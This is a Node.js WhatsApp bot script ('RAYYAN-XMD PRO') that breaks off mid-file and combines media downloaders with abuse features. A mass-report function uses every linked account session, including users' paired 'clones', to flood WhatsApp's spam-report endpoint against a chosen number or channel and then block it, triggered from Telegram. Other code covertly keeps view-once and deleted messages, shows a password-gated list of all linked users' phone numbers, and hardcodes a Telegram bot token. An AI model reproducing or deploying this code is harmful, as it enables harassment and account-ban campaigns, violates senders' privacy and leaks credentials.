const dns = require('dns');
if (dns.setDefaultResultOrder) dns.setDefaultResultOrder('ipv4first');

global.liveWaSockets = new Map();
global.activeBotSessions = new Map();
global.antiLinkGroups = new Set();

const {
    default: makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
    DisconnectReason,
    fetchLatestBaileysVersion,
    downloadContentFromMessage,
    jidNormalizedUser,
    Browsers
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const os = require('os');
const util = require('util');
const { exec } = require('child_process');
const axios = require('axios');

// ================= BLOCK LIBSIGNAL BUFFER LOGS & RAM CLEANER =================
const _stdout = process.stdout.write.bind(process.stdout);
const _stderr = process.stderr.write.bind(process.stderr);
function isNoise(chunk) {
    const s = String(chunk || '');
    return /SessionEntry|ephemeralKeyPair|pendingPreKey|remoteIdentityKey|baseKey:|rootKey:|Closing session|Bad MAC|Failed to decrypt|MessageCounterError/.test(s);
}
process.stdout.write = (c, e, cb) => isNoise(c) ? true : _stdout(c, e, cb);
process.stderr.write = (c, e, cb) => isNoise(c) ? true : _stderr(c, e, cb);

// ================= CONFIGURATION & MANUAL TELEGRAM SETTINGS =================
const WEB_PORT = Number(process.env.PORT || process.env.SERVER_PORT || 3000);
const APP_HOST = process.env.HOST || '0.0.0.0';
const SETTINGS_FILE = './bot_settings.json';

const CONFIG = {
    botName: 'RAYYAN-XMD PRO',
    version: '15.0 SUPREME',
    prefix: '.',
    ownerName: 'Mr. Rayyan YouTuber',
    ownerNumber: '923329553169',
    sessionDir: './session',
    clonesDir: './clones',
    tempDir: './temp',
    YOUTUBE: 'https://youtube.com/@silladon29?si=yQ9KooeUuEjJHZ6Z',
    autoReply: true,
    antiDelete: true,
    autoStatus: true,
    heartViewOnce: true,
    autoReact: true,
    autoReactAll: true,
    reactEmoji: '',
    // 👇 MANUAL TELEGRAM TOKEN & ID (Or use .settg <token> <id> in WhatsApp)
    tgToken: process.env.TG_TOKEN || '8637098547:AAF4SKzW3r_jDzE2ozrUXXSXaUgwPU-xZ-4',
    tgChatId: process.env.TG_CHAT_ID || '8179433872'
};

if (fs.existsSync(SETTINGS_FILE)) {
    try {
        const saved = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
        if (saved.tgToken) CONFIG.tgToken = saved.tgToken;
        if (saved.tgChatId) CONFIG.tgChatId = saved.tgChatId;
        if (saved.ownerNumber) CONFIG.ownerNumber = saved.ownerNumber;
    } catch (e) {}
}

function saveSettings() {
    try {
        fs.writeFileSync(SETTINGS_FILE, JSON.stringify({
            tgToken: CONFIG.tgToken,
            tgChatId: CONFIG.tgChatId,
            ownerNumber: CONFIG.ownerNumber
        }, null, 2));
    } catch (e) {}
}

if (!fs.existsSync(CONFIG.tempDir)) fs.mkdirSync(CONFIG.tempDir, { recursive: true });
if (!fs.existsSync(CONFIG.clonesDir)) fs.mkdirSync(CONFIG.clonesDir, { recursive: true });

const processedMsgs = new Set();
const msgStore = new Map();
const senderStore = new Map();
const viewOnceVault = new Map();
const groupCache = new Map();
const activeGames = new Map();
const aiMemory = new Map();
const tgUserStates = new Map();
let mainWaSock = null;
let activeTgChatId = CONFIG.tgChatId || '';

setInterval(() => {
    if (msgStore.size > 200) msgStore.clear();
    if (senderStore.size > 200) senderStore.clear();
    if (viewOnceVault.size > 30) viewOnceVault.clear();
    if (processedMsgs.size > 400) processedMsgs.clear();
}, 45000);

const DEV_FOOTER = `\n\n━━━━━━━━━━━━━━━━━━━━━━\n👑 *DEVELOPER:* ${CONFIG.ownerName}\n📺 *YOUTUBE:* ${CONFIG.YOUTUBE}`;
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';

// ================= CORE HELPERS =================
function formatUptime(sec) {
    const d = Math.floor(sec / 86400), h = Math.floor((sec % 86400) / 3600), m = Math.floor((sec % 3600) / 60), s = Math.floor(sec % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
}

async function downloadMedia(message, type) {
    const stream = await downloadContentFromMessage(message, type);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
    return buffer;
}

function extractViewOnceMedia(obj) {
    if (!obj) return null;
    const isVO = !!(
        obj?.viewOnceMessageV2 || obj?.viewOnceMessage || obj?.viewOnceMessageV2Extension ||
        obj?.ephemeralMessage?.message?.viewOnceMessageV2 || obj?.ephemeralMessage?.message?.viewOnceMessage ||
        obj?.imageMessage?.viewOnce || obj?.videoMessage?.viewOnce || obj?.audioMessage?.viewOnce
    );
    const inner =
        obj?.viewOnceMessageV2?.message || obj?.viewOnceMessage?.message || obj?.viewOnceMessageV2Extension?.message ||
        obj?.ephemeralMessage?.message?.viewOnceMessageV2?.message || obj?.ephemeralMessage?.message || obj;
    if (inner?.imageMessage) return { type: 'image', media: inner.imageMessage, isViewOnce: isVO };
    if (inner?.videoMessage) return { type: 'video', media: inner.videoMessage, isViewOnce: isVO };
    if (inner?.audioMessage) return { type: 'audio', media: inner.audioMessage, isViewOnce: isVO };
    return null;
}

function isHeartEmoji(str) {
    if (!str) return false;
    const s = str.trim();
    return ['❤️', '❤', '♥️', '♥', '💖', '💗', '💓', '💘', '💝', '❤️‍🔥', '❣️', '💕'].includes(s);
}

function execPromise(cmd) {
    return new Promise((res, rej) => exec(cmd, { maxBuffer: 50 * 1024 * 1024 }, (err, out, serr) => err ? rej(err) : res(out || serr)));
}

// ================= SMART QUANTITY PARSER (Supports <7>, -7, 7, | 7, Unlimited for Report) =================
function parseInputAndCount(rawText, defaultTopic = '', defaultCount = 1, maxLimit = 10) {
    let txt = String(rawText || '').replace(/[<>]/g, ' ').replace(/^[.|\-]+/, '').trim();
    let count = defaultCount;

    if (/^-?\d+$/.test(txt)) {
        count = Math.min(maxLimit, Math.max(1, Math.abs(parseInt(txt, 10))));
        return { query: defaultTopic, count, isRandom: true };
    }

    const match = txt.match(/^(.*?)(?:\s*\|\s*|\s+-?|\s*x)(\d+)$/i);
    if (match && match[1].trim()) {
        txt = match[1].trim();
        count = Math.min(maxLimit, Math.max(1, parseInt(match[2], 10)));
    }

    const cleaned = txt
        .replace(/\b(rendom|random|rand|videos|video|vid|vids|reels|reel|spotlight|shorts|short|viral|tiktok|snapchat|snap|instagram|insta|facebook|fb)\b/gi, '')
        .replace(/\s+/g, ' ')
        .trim();

    if (!cleaned || cleaned.length < 2) return { query: defaultTopic, count, isRandom: true };
    return { query: cleaned, count, isRandom: false };
}

// ================= DIRECT YOUTUBE SCRAPER (ZERO GOOGLEBOT ERROR!) =================
function extractYtId(url) {
    const m = String(url || '').match(/(?:youtu\.be\/|youtube\.com\/(?:watch\?v=|embed\/|v\/|shorts\/|live\/))([a-zA-Z0-9_-]{11})/);
    return m ? m[1] : null;
}

async function searchYouTubeDirect(query) {
    const q = encodeURIComponent(query || 'Pakistani song');
    // 1. Direct YouTube HTML Scraper with Chrome User-Agent (Never blocked like yt-search!)
    try {
        const res = await axios.get(`https://www.youtube.com/results?search_query=${q}&hl=en`, {
            timeout: 9000,
            headers: { 'User-Agent': UA, 'Accept-Language': 'en-US,en;q=0.9' }
        });
        const html = String(res.data || '');
        const results = [];
        const regex = /"videoRenderer":\{"videoId":"([a-zA-Z0-9_-]{11})"[\s\S]*?"title":\{"runs":\[\{"text":"([^"]+)"/g;
        let match;
        while ((match = regex.exec(html)) !== null && results.length < 15) {
            results.push({
                videoId: match[1],
                url: `https://www.youtube.com/watch?v=${match[1]}`,
                title: match[2].replace(/\\u0026/g, '&')
            });
        }
        if (results.length > 0) return results;
    } catch (e) {}

    // 2. Fallback Cloud Search APIs
    for (const api of [
        `https://delirius-apiofc.vercel.app/search/ytsearch?q=${q}`,
        `https://api.siputzx.my.id/api/s/youtube?query=${q}`,
        `https://api.vreden.my.id/api/ytsearch?query=${q}`
    ]) {
        try {
            const r = await axios.get(api, { timeout: 8000, headers: { 'User-Agent': UA } });
            const list = r.data?.data || r.data?.result || r.data?.results || [];
            if (Array.isArray(list) && list.length > 0) {
                return list.map(x => {
                    const id = extractYtId(x.url || x.link) || x.videoId || x.id;
                    return { videoId: id, url: `https://www.youtube.com/watch?v=${id}`, title: x.title || query };
                }).filter(x => x.videoId);
            }
        } catch (e) {}
    }
    return [];
}

async function fetchBufferSafe(url, minBytes = 15000, customHeaders = {}) {
    if (!url || typeof url !== 'string' || !url.startsWith('http')) return null;
    try {
        const res = await axios.get(url, {
            responseType: 'arraybuffer',
            timeout: 25000,
            maxRedirects: 5,
            headers: { 'User-Agent': UA, 'Accept': '*/*', ...customHeaders }
        });
        const ct = String(res.headers?.['content-type'] || '').toLowerCase();
        if (ct.includes('text/html') || ct.includes('application/json')) return null;
        if (res.data && res.data.byteLength >= minBytes) return Buffer.from(res.data);
    } catch (e) {}
    return null;
}

// ================= STANDALONE YT-DLP BINARY ENGINE =================
const YTDLP_BIN = path.join(__dirname, 'yt-dlp');
async function ensureYtDlp() {
    if (fs.existsSync(YTDLP_BIN) && fs.statSync(YTDLP_BIN).size > 1000000) return YTDLP_BIN;
    if (os.platform() !== 'linux') return null;
    try {
        const arch = os.arch();
        const bin = arch === 'arm64' || arch === 'aarch64' ? 'yt-dlp_linux_aarch64' : 'yt-dlp_linux';
        const r = await axios.get(`https://github.com/yt-dlp/yt-dlp/releases/latest/download/${bin}`, {
            responseType: 'arraybuffer',
            timeout: 45000,
            headers: { 'User-Agent': UA }
        });
        if (r.data && r.data.byteLength > 1000000) {
            fs.writeFileSync(YTDLP_BIN, Buffer.from(r.data));
            fs.chmodSync(YTDLP_BIN, 0o755);
            return YTDLP_BIN;
        }
    } catch (e) {}
    return null;
}
setTimeout(() => ensureYtDlp().catch(() => {}), 500);

async function downloadViaYtDlp(target, isAudio = false) {
    const bin = await ensureYtDlp();
    const cmdBin = bin ? `"${bin}"` : 'yt-dlp';
    const out = path.join(CONFIG.tempDir, `media_${Date.now()}_${Math.floor(Math.random() * 9999)}.${isAudio ? 'm4a' : 'mp4'}`);
    const fmt = isAudio ? '-f "bestaudio[ext=m4a]/bestaudio/best"' : '-f "best[ext=mp4]/b/best"';
    try {
        await execPromise(`${cmdBin} --no-check-certificates --no-warnings --no-playlist --geo-bypass ${fmt} -o "${out}" "${target.replace(/"/g, '')}"`);
        if (fs.existsSync(out)) {
            const buf = fs.readFileSync(out);
            fs.unlinkSync(out);
            if (buf.byteLength > 20000) return buf;
        }
    } catch (e) {
        if (fs.existsSync(out)) try { fs.unlinkSync(out); } catch (err) {}
    }
    return null;
}

// ================= 🎧 UNSTOPPABLE FULL SONG ENGINE (.play) =================
async function downloadFullSongGuaranteed(rawQuery) {
    const MIN_SONG = 500000;
    const cleanQ = String(rawQuery || 'Pasoori')
        .replace(/https?:\/\/[^\s]+/g, '')
        .replace(/\b(lyrical|official|full\s*video|video\s*song|hd|4k)\b/gi, '')
        .split(/[|–—]/)[0]
        .trim() || 'Pasoori';
    const encQ = encodeURIComponent(cleanQ);

    // 1. Official JioSaavn v3 wap6dot0 API -> Direct aac.saavncdn.com 320kbps Full Song (No OpenSSL DES needed!)
    try {
        const jioV3 = `https://www.jiosaavn.com/api.php?__call=search.getResults&_format=json&_marker=0&cc=in&includeMetaTags=1&q=${encQ}`;
        const r = await axios.get(jioV3, { timeout: 9000, headers: { 'User-Agent': UA, 'Referer': 'https://www.jiosaavn.com/' } });
        const d = typeof r.data === 'string' ? JSON.parse(r.data.replace(/^[^{]+/, '')) : r.data;
        for (const s of (d?.results || [])) {
            const prev = s.media_preview_url || s?.more_info?.vlink || '';
            if (prev && prev.includes('saavncdn.com')) {
                for (const br of ['_320.mp4', '_160.mp4', '_96.mp4']) {
                    const directUrl = prev.replace('preview.saavncdn.com', 'aac.saavncdn.com').replace(/_96_p\.mp4|_96\.mp4/i, br);
                    const buf = await fetchBufferSafe(directUrl, MIN_SONG);
                    if (buf) return { buffer: buf, title: s.song || s.title || cleanQ };
                }
            }
            const encMedia = s?.more_info?.encrypted_media_url || s.encrypted_media_url;
            if (encMedia) {
                const tokUrl = `https://www.jiosaavn.com/api.php?__call=song.generateAuthToken&url=${encodeURIComponent(encMedia)}&bitrate=160&api_version=4&_format=json&ctx=web6dot0&_marker=0`;
                const tr = await axios.get(tokUrl, { timeout: 8000, headers: { 'User-Agent': UA } });
                const td = typeof tr.data === 'string' ? JSON.parse(tr.data.replace(/^[^{]+/, '')) : tr.data;
                if (td?.auth_url) {
                    const buf = await fetchBufferSafe(td.auth_url, MIN_SONG);
                    if (buf) return { buffer: buf, title: s.song || s.title || cleanQ };
                }
            }
        }
    } catch (e) {}

    // 2. Saavn Cloud Mirror APIs
    for (const api of [
        `https://saavn.dev/api/search/songs?query=${encQ}`,
        `https://jiosaavn-api-privatecvc2.vercel.app/search/songs?query=${encQ}`,
        `https://saavn.sumit.co/api/search/songs?query=${encQ}`
    ]) {
        try {
            const r = await axios.get(api, { timeout: 8000, headers: { 'User-Agent': UA } });
            const list = r.data?.data?.results || r.data?.results || [];
            for (const item of list) {
                const dl = item.downloadUrl || item.download_url || [];
                const u = Array.isArray(dl) ? (dl[dl.length - 1]?.url || dl[dl.length - 1]?.link || dl[0]?.url) : dl;
                const buf = await fetchBufferSafe(u, MIN_SONG);
                if (buf) return { buffer: buf, title: item.name || item.title || cleanQ };
            }
        } catch (e) {}
    }

    // 3. Direct YouTube Search + Cloud MP3 APIs
    const ytList = await searchYouTubeDirect(`${cleanQ} song`);
    const firstYt = ytList[0];
    if (firstYt?.url) {
        const u = encodeURIComponent(firstYt.url);
        for (const api of [
            `https://delirius-apiofc.vercel.app/download/ytmp3?url=${u}`,
            `https://api.vreden.my.id/api/ytmp3?url=${u}`,
            `https://api.siputzx.my.id/api/d/ytmp3?url=${u}`,
            `https://api.ryzendesu.vip/api/downloader/ytmp3?url=${u}`,
            `https://apis-keith.vercel.app/download/dlmp3?url=${u}`,
            `https://api.davidcyriltech.my.id/download/ytmp3?url=${u}`
        ]) {
            try {
                const r = await axios.get(api, { timeout: 12000, headers: { 'User-Agent': UA } });
                const d = r.data;
                const link = d?.data?.download?.url || d?.result?.download?.url || d?.result?.download_url || d?.result?.url || d?.data?.dl || d?.url;
                const buf = await fetchBufferSafe(link, MIN_SONG);
                if (buf) return { buffer: buf, title: firstYt.title || cleanQ };
            } catch (e) {}
        }
    }

    // 4. SoundCloud Full Track via yt-dlp
    const scBuf = await downloadViaYtDlp(`scsearch1:${cleanQ}`, true);
    if (scBuf) return { buffer: scBuf, title: cleanQ };

    return null;
}

// ================= 🎬 UNSTOPPABLE VIDEO ENGINE (TikTok, Snapchat, IG, FB, YT) =================
async function fetchPlatformVideosGuaranteed(platform, userQuery = '', count = 1, isRandom = true) {
    const defaults = {
        tiktok: 'pakistan viral tiktok status',
        snapchat: 'snapchat spotlight aesthetic status',
        instagram: 'pakistani drama ost status reel',
        facebook: 'pakistani funny viral video',
        youtube: 'pakistani viral video song'
    };
    const searchQ = (!isRandom && userQuery) ? userQuery : (defaults[platform] || defaults.tiktok);
    const encQ = encodeURIComponent(searchQ);
    const results = [];
    const seen = new Set();

    // 1. TikWM POST Search (Fixed URL resolver - allows tikwm.com relative & full CDN paths!)
    if (platform !== 'youtube') {
        try {
            const form = new URLSearchParams();
            form.append('keywords', searchQ);
            form.append('count', '30');
            const r = await axios.post('https://www.tikwm.com/api/feed/search', form.toString(), {
                timeout: 10000,
                headers: { 'User-Agent': UA, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' }
            });
            let vids = r.data?.data?.videos || [];
            if (isRandom) vids = vids.sort(() => 0.5 - Math.random());
            for (const v of vids) {
                if (results.length >= count) break;
                const rawUrl = v.play || v.wmplay || v.hdplay;
                if (!rawUrl) continue;
                const fullUrl = rawUrl.startsWith('http') ? rawUrl : `https://www.tikwm.com${rawUrl}`;
                if (seen.has(fullUrl)) continue;
                seen.add(fullUrl);
                const buf = await fetchBufferSafe(fullUrl, 15000, { 'Referer': 'https://www.tikwm.com/' });
                if (buf) results.push({ buffer: buf, title: String(v.title || searchQ).slice(0, 80) });
            }
        } catch (e) {}
    }

    // 2. Multi-Server TikTok/Short Video Search APIs
    if (results.length < count && platform !== 'youtube') {
        for (const api of [
            `https://delirius-apiofc.vercel.app/search/tiktoksearch?query=${encQ}`,
            `https://api.siputzx.my.id/api/s/tiktok?query=${encQ}`,
            `https://api.vreden.my.id/api/tiktoksearch?query=${encQ}`,
            `https://api.agatz.xyz/api/tiktoksearch?message=${encQ}`,
            `https://apis-keith.vercel.app/search/tiktoksearch?q=${encQ}`
        ]) {
            if (results.length >= count) break;
            try {
                const r = await axios.get(api, { timeout: 10000, headers: { 'User-Agent': UA } });
                let list = r.data?.meta || r.data?.data?.videos || r.data?.data || r.data?.result || [];
                if (Array.isArray(list)) {
                    if (isRandom) list = list.sort(() => 0.5 - Math.random());
                    for (const item of list) {
                        if (results.length >= count) break;
                        const u = item.hd || item.play || item.no_watermark || item.nowm || item.video || item.url;
                        if (u && !seen.has(u)) {
                            seen.add(u);
                            const buf = await fetchBufferSafe(u, 15000);
                            if (buf) results.push({ buffer: buf, title: String(item.title || searchQ).slice(0, 80) });
                        }
                    }
                }
            } catch (e) {}
        }
    }

    // 3. Direct YouTube Video Search + Cloud MP4 APIs (Primary for .yt, Backup for others)
    if (results.length < count) {
        const ytVideos = await searchYouTubeDirect(platform === 'youtube' ? searchQ : `${searchQ} shorts`);
        for (const yv of ytVideos) {
            if (results.length >= count) break;
            const u = encodeURIComponent(yv.url);
            for (const api of [
                `https://delirius-apiofc.vercel.app/download/ytmp4?url=${u}`,
                `https://api.vreden.my.id/api/ytmp4?url=${u}`,
                `https://api.siputzx.my.id/api/d/ytmp4?url=${u}`,
                `https://api.ryzendesu.vip/api/downloader/ytmp4?url=${u}`,
                `https://apis-keith.vercel.app/download/dlmp4?url=${u}`
            ]) {
                try {
                    const r = await axios.get(api, { timeout: 12000, headers: { 'User-Agent': UA } });
                    const d = r.data;
                    const link = d?.data?.download?.url || d?.result?.download?.url || d?.result?.url || d?.data?.dl || d?.url;
                    const buf = await fetchBufferSafe(link, 25000);
                    if (buf) {
                        results.push({ buffer: buf, title: yv.title || searchQ });
                        break;
                    }
                } catch (e) {}
            }
        }
    }

    // 4. Reddit Direct v.redd.it Video CDN Backup (100% Unblocked on all VPS IPs)
    if (results.length < count) {
        try {
            const r = await axios.get(`https://www.reddit.com/search.json?q=${encQ}&sort=hot&limit=30`, {
                timeout: 9000,
                headers: { 'User-Agent': 'web:rayyan.xmd.v15:1.0 (by /u/rayyan)' }
            });
            let posts = (r.data?.data?.children || []).map(c => c.data).filter(Boolean);
            if (isRandom) posts = posts.sort(() => 0.5 - Math.random());
            for (const p of posts) {
                if (results.length >= count) break;
                const vUrl = p?.secure_media?.reddit_video?.fallback_url || p?.media?.reddit_video?.fallback_url || p?.preview?.reddit_video_preview?.fallback_url;
                if (vUrl && !seen.has(vUrl)) {
                    seen.add(vUrl);
                    const buf = await fetchBufferSafe(vUrl, 15000);
                    if (buf) results.push({ buffer: buf, title: String(p.title || searchQ).slice(0, 80) });
                }
            }
        } catch (e) {}
    }

    return results;
}

async function downloadDirectSocialLink(url) {
    const q = encodeURIComponent(url);
    try {
        const form = new URLSearchParams();
        form.append('url', url);
        const r = await axios.post('https://www.tikwm.com/api/', form.toString(), {
            timeout: 10000,
            headers: { 'User-Agent': UA, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' }
        });
        const d = r.data?.data;
        if (d) {
            const raw = d.play || d.hdplay || d.wmplay;
            if (raw) {
                const full = raw.startsWith('http') ? raw : `https://www.tikwm.com${raw}`;
                const buf = await fetchBufferSafe(full, 15000, { 'Referer': 'https://www.tikwm.com/' });
                if (buf) return buf;
            }
        }
    } catch (e) {}

    for (const api of [
        `https://api.tiklydown.eu.org/api/download?url=${q}`,
        `https://delirius-apiofc.vercel.app/download/tiktok?url=${q}`,
        `https://api.siputzx.my.id/api/d/tiktok?url=${q}`,
        `https://api.vreden.my.id/api/tiktok?url=${q}`,
        `https://api.siputzx.my.id/api/d/igdl?url=${q}`
    ]) {
        try {
            const r = await axios.get(api, { timeout: 10000, headers: { 'User-Agent': UA } });
            const d = r.data;
            const link = d?.video?.noWatermark || d?.data?.meta?.media?.[0]?.org || d?.data?.[0]?.url || d?.result?.url || d?.result?.play;
            const buf = await fetchBufferSafe(link, 15000);
            if (buf) return buf;
        } catch (e) {}
    }

    return await downloadViaYtDlp(url, false);
}

// ================= ⚡ MULTI-BOT REACTION ENGINE (NO HEART EMOJI IN DEFAULT!) =================
// Strictly NO heart emojis here so auto-react NEVER triggers Secret View-Once!
const AUTO_REACT_EMOJIS = ['⚡', '🔥', '👑', '🚀', '💎', '✨', '💯', '🎯', '🦁', '🌟'];

function getAllActiveSockets(primarySock) {
    const set = new Set();
    if (primarySock) set.add(primarySock);
    if (mainWaSock) set.add(mainWaSock);
    for (const s of global.liveWaSockets.values()) if (s) set.add(s);
    return Array.from(set);
}

function splitEmojis(str) {
    if (!str) return [];
    try {
        if (typeof Intl !== 'undefined' && Intl.Segmenter) {
            return Array.from(new Intl.Segmenter('en', { granularity: 'grapheme' }).segment(str.trim())).map(x => x.segment.trim()).filter(Boolean);
        }
    } catch (e) {}
    return Array.from(str.trim()).filter(x => x.trim());
}

async function triggerMultiBotReaction(primarySock, remoteJid, msgKey, customEmoji = '', serverId = null) {
    if (!msgKey || !remoteJid) return 0;
    const sockets = getAllActiveSockets(primarySock);
    const customList = splitEmojis(customEmoji || CONFIG.reactEmoji);
    let count = 0;

    for (let i = 0; i < sockets.length; i++) {
        const s = sockets[i];
        const emoji = customList.length > 0
            ? customList[i % customList.length]
            : AUTO_REACT_EMOJIS[(i + Math.floor(Math.random() * AUTO_REACT_EMOJIS.length)) % AUTO_REACT_EMOJIS.length];
        try {
            if (remoteJid.endsWith('@newsletter')) {
                const sId = String(serverId || msgKey.server_id || msgKey.id || '');
                try { await s.newsletterFollow?.(remoteJid); } catch (e) {}
                if (typeof s.newsletterReactMessage === 'function') {
                    await s.newsletterReactMessage(remoteJid, sId, emoji);
                } else if (typeof s.query === 'function') {
                    await s.query({
                        tag: 'message',
                        attrs: { to: remoteJid, type: 'reaction', server_id: sId, id: String(Date.now()) },
                        content: [{ tag: 'reaction', attrs: { code: emoji } }]
                    });
                }
                count++;
            } else {
                await s.sendMessage(remoteJid, { react: { text: emoji, key: msgKey } });
                count++;
            }
        } catch (e) {}
    }
    return count;
}

// ================= 🚨 UNLIMITED QUANTITY MASS REPORT ENGINE (DEFAULT = 2) =================
async function executeMassReport(primarySock, targetJid, msgId = '', repeatCount = 2, isChannel = false) {
    const sockets = getAllActiveSockets(primarySock);
    const loops = Math.max(1, Number(repeatCount) || 2);
    let totalSent = 0;

    for (let round = 1; round <= loops; round++) {
        for (const s of sockets) {
            if (!s) continue;
            try {
                if (typeof s.query === 'function' && targetJid) {
                    const contentNode = msgId
                        ? [{ tag: 'message', attrs: isChannel ? { server_id: String(msgId) } : { id: String(msgId), from: targetJid } }]
                        : [];
                    await s.query({
                        tag: 'iq',
                        attrs: { to: 's.whatsapp.net', type: 'set', xmlns: 'spam', id: `${Date.now()}_${round}` },
                        content: [{
                            tag: 'spam_list',
                            attrs: { jid: targetJid, spam_flow: isChannel ? 'NewsletterInfo' : 'MessageMenu' },
                            content: contentNode
                        }]
                    }).catch(() => {});
                }
                if (round === loops && !isChannel) {
                    const cleanTarget = targetJid.split('@')[0].split(':')[0];
                    if (cleanTarget !== CONFIG.ownerNumber && typeof s.updateBlockStatus === 'function') {
                        await s.updateBlockStatus(targetJid, 'block').catch(() => {});
                    }
                }
                totalSent++;
            } catch (e) {}
            await new Promise(r => setTimeout(r, 60));
        }
    }
    return totalSent;
}

// ================= 🔐 SECRET CONNECTED USERS REPORT (.user 786512) =================
function getSecretConnectedUsersReport() {
    const users = [];
    const mainCreds = path.join(CONFIG.sessionDir, 'creds.json');
    if (fs.existsSync(mainCreds)) {
        try {
            const c = JSON.parse(fs.readFileSync(mainCreds, 'utf8'));
            if (c?.me?.id || c?.registered) {
                users.push({ num: c?.me?.id ? c.me.id.split(':')[0].split('@')[0] : CONFIG.ownerNumber, name: c?.me?.name || 'Owner', source: '👑 Main Bot' });
            }
        } catch (e) {}
    }
    if (fs.existsSync(CONFIG.clonesDir)) {
        for (const f of fs.readdirSync(CONFIG.clonesDir)) {
            const cf = path.join(CONFIG.clonesDir, f, 'creds.json');
            if (fs.existsSync(cf)) {
                try {
                    const c = JSON.parse(fs.readFileSync(cf, 'utf8'));
                    if (c?.me?.id || c?.registered) {
                        const num = c?.me?.id ? c.me.id.split(':')[0].split('@')[0] : f.replace(/^(web_|tg_|session_)/, '');
                        users.push({ num, name: c?.me?.name || 'User', source: f.startsWith('web_') ? '🌐 Website' : f.startsWith('tg_') ? '✈️ Telegram' : '📱 WhatsApp' });
                    }
                } catch (e) {}
            }
        }
    }
    const unique = Array.from(new Map(users.map(u => [u.num, u])).values());
    const lines = unique.map((u, i) => `${i + 1}. *+${u.num}* (${u.name}) — [${u.source}]`).join('\n');
    return {
        count: unique.length,
        text: `🔐 *SECRET ADMIN PANEL*\n👥 *Total Connected Bots:* *${unique.length}*\n\n${lines || 'No users connected.'}`
    };
}

// ================= 🤖 AI ENGINE =================
async function askRayyanAI(userId, promptText) {
    const sys = `You are ${CONFIG.botName}, created by ${CONFIG.ownerName} (${CONFIG.YOUTUBE}).`;
    try {
        const r = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(promptText)}?model=openai&system=${encodeURIComponent(sys)}`, { timeout: 14000 });
        if (r.data) return typeof r.data === 'string' ? r.data.trim() : JSON.stringify(r.data);
    } catch (e) {}
    return `Assalamu Alaikum! Main *${CONFIG.botName}* hoon (Developer: *${CONFIG.ownerName}*).`;
}

// ================= ✈️ TELEGRAM BOT ENGINE (WITH /report & 8-MIN KEEP-ALIVE) =================
let tgPollingActive = false;
let tgOffset = 0;

async function tgSend(chatId, text) {
    if (!CONFIG.tgToken || !chatId) return null;
    try {
        const r = await axios.post(`https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage`, {
            chat_id: chatId,
            text,
            parse_mode: 'Markdown'
        });
        return r.data?.result?.message_id || null;
    } catch (e) {
        return null;
    }
}

setInterval(async () => {
    const target = CONFIG.tgChatId || activeTgChatId;
    if (!CONFIG.tgToken || !target) return;
    const mId = await tgSend(target, `⚡ *.ping* — *${CONFIG.botName} KEEP-ALIVE*\n🟢 *Status:* 24/7 Active\n⏱️ *Uptime:* ${formatUptime(process.uptime())}`);
    if (mId) {
        setTimeout(() => {
            axios.post(`https://api.telegram.org/bot${CONFIG.tgToken}/deleteMessage`, { chat_id: target, message_id: mId }).catch(() => {});
        }, 120000);
    }
}, 8 * 60 * 1000);

function startTelegramBotEngine() {
    if (!CONFIG.tgToken || tgPollingActive) return;
    tgPollingActive = true;
    if (CONFIG.tgChatId) tgSend(CONFIG.tgChatId, `✅ *${CONFIG.botName} (${CONFIG.version}) IS ONLINE 24/7!*`);

    setInterval(async () => {
        if (!CONFIG.tgToken) return;
        try {
            const res = await axios.get(`https://api.telegram.org/bot${CONFIG.tgToken}/getUpdates?offset=${tgOffset + 1}&timeout=4`);
            for (const up of (res.data?.result || [])) {
                tgOffset = up.update_id;
                const msg = up.message;
                if (!msg || !msg.text) continue;
                const cId = msg.chat.id;
                activeTgChatId = String(cId);
                if (!CONFIG.tgChatId) { CONFIG.tgChatId = String(cId); saveSettings(); }
                const txt = msg.text.trim();

                if (txt === '/start' || txt === '/menu') {
                    await tgSend(cId, `👑 *${CONFIG.botName}*\n\n• /connect <923xx>\n• /report <923xx> <quantity>\n• /user 786512\n• /ping`);
                } else if (txt.startsWith('/connect')) {
                    const num = (txt.split(/ +/)[1] || '').replace(/[^0-9]/g, '');
                    if (num.length < 10) { await tgSend(cId, '📱 Example: `/connect 923329553169`'); continue; }
                    await tgSend(cId, `⏳ Generating Pairing Code for +${num}...`);
                    const cDir = path.join(CONFIG.clonesDir, `tg_${num}`);
                    if (fs.existsSync(cDir)) fs.rmSync(cDir, { recursive: true, force: true });
                    startRayyanBot(cDir, true, null, null, num, cId);
                } else if (txt.startsWith('/report') || txt.startsWith('.report')) {
                    const rawArgs = txt.replace(/^(\/report|\.report)\s*/i, '');
                    const { query, count } = parseInputAndCount(rawArgs, '', 2, 1000);
                    const num = query.replace(/[^0-9]/g, '');
                    if (num.length < 10) {
                        await tgSend(cId, '🚨 *TELEGRAM MASS REPORT*\nExample: `/report 923001234567 15` (Default = 2)');
                        continue;
                    }
                    await tgSend(cId, `🚨 *Reporting +${num} (${count}x rounds)...*`);
                    const total = await executeMassReport(mainWaSock, `${num}@s.whatsapp.net`, '', count, false);
                    await tgSend(cId, `✅ *REPORT COMPLETED!*\n🎯 *Target:* +${num}\n🔢 *Quantity:* ${count}x\n🔥 *Total Packets Sent:* ${total}`);
                } else if (txt.startsWith('/user')) {
                    if ((txt.split(/ +/)[1] || '') === '786512') await tgSend(cId, getSecretConnectedUsersReport().text);
                    else await tgSend(cId, '🔒 Access Denied!');
                } else if (txt === '/ping' || txt === '.ping') {
                    await tgSend(cId, `⚡ *PONG!* Uptime: ${formatUptime(process.uptime())}`);
                }
            }
        } catch (e) {}
    }, 3500);
}

// ================= 📱 MAIN WHATSAPP BOT ENGINE =================
async function startRayyanBot(customSessionDir = CONFIG.sessionDir, isClone = false, cloneTargetJid = null, parentSock = null, phoneForClone = '', tgChatIdForClone = null) {
    const resolvedDir = path.resolve(customSessionDir);
    if (!phoneForClone && global.activeBotSessions.get(resolvedDir) === 'ONLINE') return;
